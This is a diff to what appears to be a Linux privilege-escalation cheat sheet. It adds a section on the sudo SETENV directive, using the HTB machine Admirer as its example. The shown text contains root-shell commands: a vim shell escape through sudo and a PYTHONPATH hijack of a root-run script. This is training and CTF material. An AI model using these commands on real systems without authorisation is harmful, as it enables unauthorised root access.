@@ -688,7 +688,6 @@ Sudo configuration might allow a user to execute some command with another user 
 
 ```text
 $ sudo -l
-
 User demo may run the following commands on crashlab:
     (root) NOPASSWD: /usr/bin/vim
 ```
@@ -697,6 +696,22 @@ In this example the user `demo` can run `vim` as `root`, it is now trivial to ge
 
 ```text
 sudo vim -c '!sh'
+```
+
+### SETENV
+
+This directive allows the user to **set an environment variable** while executing something:
+
+```bash
+$ sudo -l
+User waldo may run the following commands on admirer:
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+```
+
+This example, **based on HTB machine Admirer**, was **vulnerable** to **PYTHONPATH hijacking** in order to load an arbitrary python library while executing the script as root:
+
+```bash
+sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
 
 ### Sudo execution bypassing paths
